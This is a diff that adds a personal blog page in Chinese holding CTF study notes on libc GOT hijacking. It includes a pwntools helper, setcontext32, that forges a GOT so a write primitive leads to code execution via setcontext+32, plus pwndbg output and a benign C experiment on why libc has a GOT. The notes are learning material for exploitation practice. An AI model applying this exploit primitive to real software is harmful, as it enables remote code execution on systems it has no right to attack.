@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>giacomo&#39;s journal</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+    <link
+    rel="stylesheet"
+    href="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.css"
+    />
+    <script>hljs.highlightAll();</script>
+    <script>hljs.addPlugin(new CopyButtonPlugin());</script>
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery-3.7.1.min.js"></script>
+
+    
+<script src="/js/bootstrap-transition.js"></script>
+
+    
+<script src="/js/zoom.js"></script>
+
+
+    <style>
+        .markdown-body {
+            box-sizing: border-box;
+            min-width: 200px;
+            max-width: 980px;
+            margin-left: 28%;
+            margin-top: 6%;
+
+            padding: 45px;
+        }
+
+        @media (max-width: 767px) {
+            .markdown-body {
+                padding: 15px;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <header class="header">
+
+    <div class="navbar-left">
+        <div class="avatar">
+            <a href="/">
+                <img src="https://91ac0m0.github.io/img/avatar.jpg"alt="avatar">
+            </a>
+        </div>
+        <div class="nav-title">
+            <a class="nav-brand" href="/">giacomo</a>
+        </div>
+    </div>
+    <div class="navbar-right">
+        <ul class="nav-links">
+            
+                <div class="nav-link">
+                    <a href="/about" class="menu-item-link">
+                        about
+                    </a>
+                </div>
+            
+        </ul>
+
+    </div>
+    
+
+</header>
+
+    <div class = "toc_left">
+	
+    <div id="toc">
+        <!-- <strong class="sidebar-title">目录</strong> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Libc-GOT-Hijacking"><span class="toc-text">Libc-GOT-Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#trampoline"><span class="toc-text">trampoline</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-%E4%B8%BA%E5%95%A5%E6%9C%89-GOT-%E8%A1%A8"><span class="toc-text">libc 为啥有 GOT 表?</span></a></li></ol>
+    </div>
+
+</div>
+<article class="markdown-body">
+	<div></div><p>头文件和 so 动态库对应。</p>
+<h2 id="Libc-GOT-Hijacking"><a href="#Libc-GOT-Hijacking" class="headerlink" title="Libc-GOT-Hijacking"></a>Libc-GOT-Hijacking</h2><p><a target="_blank" rel="noopener" href="https://hackmd.io/@pepsipu/SyqPbk94a">got-hijackin</a> 作用 write -&gt; RCE</p>
+<h3 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h3><p>相关符号</p>
+<pre><code class="python">&gt;&gt;&gt; hex(libc.dynamic_value_by_tag(&quot;DT_PLTGOT&quot;))
+&#39;0x1ec000&#39;
+
+&gt;&gt;&gt; hex(libc.get_section_by_name(&quot;.plt&quot;).header.sh_addr)
+&#39;0x22000&#39;
+</code></pre>
+<p>用到了一个弹簧</p>
+<pre><code class="text">pwndbg&gt; x/2i 0x7ffff7dcf000 + 0x22000
+   0x7ffff7df1000:      push   QWORD PTR [rip+0x1ca002]        # 0x7ffff7fbb008
+   0x7ffff7df1006:      bnd jmp QWORD PTR [rip+0x1ca003]        # 0x7ffff7fbb010
+</code></pre>
+<p>把我们填充好的伪造的 linkmap 入栈，然后调用伪造的 runtime resolver （实际上是 setcontext+32）</p>
+<pre><code class="python">def setcontext32(libc: ELF, **kwargs) -&gt; (int, bytes):
+    got = libc.address + libc.dynamic_value_by_tag(&quot;DT_PLTGOT&quot;)
+    plt_trampoline = libc.address + libc.get_section_by_name(&quot;.plt&quot;).header.sh_addr
+    return got, flat(
+        p64(0),                               # blank
+        p64(got + 0x218),                     # rdi in setcontext
+        p64(libc.symbols[&quot;setcontext&quot;] + 32), # fake runtime resolver
+        p64(plt_trampoline) * 0x40,           # fake GOT 
+        create_ucontext(got + 0x218, rsp=libc.symbols[&quot;environ&quot;] + 8, **kwargs),
+    )
+</code></pre>
+<h2 id="libc-为啥有-GOT-表"><a href="#libc-为啥有-GOT-表" class="headerlink" title="libc 为啥有 GOT 表?"></a>libc 为啥有 GOT 表?</h2><p>GOT 是做为可执行文件的时候有的吗？当他作为动态连接库的时候也可以使用…GOT 来跳转？</p>
+<p>尝试一下，参考了 <a target="_blank" rel="noopener" href="https://stackoverflow.com/a/30622406">GNU libc.so 如何既是共享对象又是独立的可执行文件</a></p>
+<pre><code class="c">//myso.c
+#include &lt;unistd.h&gt;
+
+char const __invoke_dynamic_linker__[] __attribute__ ((section (&quot;.interp&quot;)))
+#ifdef __LP64__
+  = &quot;/lib64/ld-linux-x86-64.so.2&quot;;
+#else
+  = &quot;/lib/ld-linux.so.2&quot;;
+#endif
+
+void fun1()&#123;
+    write(1, &quot;11&quot;, 2);
+
+&#125;
+
+void fun2()&#123;
+    fun1();
+&#125;
+
+void _start(void)
+&#123;
+    static char const msg[] = &quot;Hello world!\n&quot;;
+    fun1();
+    write(STDOUT_FILENO, msg, sizeof msg - 1);
+    _exit(0);
+&#125;
+</code></pre>
+<p>fun2 是通过 GOT 来跳转到 fun1 的，而 fun2 不存在于 GOT 表中</p>
+<pre><code class="text">pwndbg&gt; got
+Filtering out read-only entries (display them with -r or --show-readonly)
+
+State of the GOT of /home/ctf/hacker/myso.so:
+GOT protection: Partial RELRO | Found 3 GOT entries passing the filter
+[0x555555558018] _exit@GLIBC_2.2.5 -&gt; 0x555555555030 ◂— endbr64
+[0x555555558020] write@GLIBC_2.2.5 -&gt; 0x555555555040 ◂— endbr64
+[0x555555558028] fun1 -&gt; 0x555555555050 ◂— endbr64
+</code></pre>
+<p>fun2 如下</p>
+<pre><code class="c">pwndbg&gt; disass fun2
+Dump of assembler code for function fun2:
+   0x000000000000117a &lt;+0&gt;:     endbr64
+   0x000000000000117e &lt;+4&gt;:     push   rbp
+   0x000000000000117f &lt;+5&gt;:     mov    rbp,rsp
+   0x0000000000001182 &lt;+8&gt;:     mov    eax,0x0
+   0x0000000000001187 &lt;+13&gt;:    call   0x1090 &lt;fun1@plt&gt;
+   0x000000000000118c &lt;+18&gt;:    nop
+   0x000000000000118d &lt;+19&gt;:    pop    rbp
+   0x000000000000118e &lt;+20&gt;:    ret
+</code></pre>
+<p>所以看起来只有可执行文件时调用的函数存放在 GOT 中。但是我没有找到文档 哎</p>
+</div>
+</article>
+
+<script src="/js/image_pop_up.js"></script>
+
+	
+
+</body>
+</html>
